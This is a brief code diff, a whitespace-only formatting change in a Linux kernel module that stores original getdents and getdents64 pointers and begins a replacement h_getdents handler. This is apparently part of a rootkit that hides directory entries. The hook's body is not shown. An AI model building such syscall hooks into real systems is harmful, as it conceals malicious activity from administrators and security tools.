@@ -7,7 +7,7 @@
 #include <linux/dirent.h>
 #include <linux/module.h>
 
-void *_getdents = NULL;
+void *_getdents   = NULL;
 void *_getdents64 = NULL;
 
 asmlinkage int64_t h_getdents(const struct pt_regs *r) {
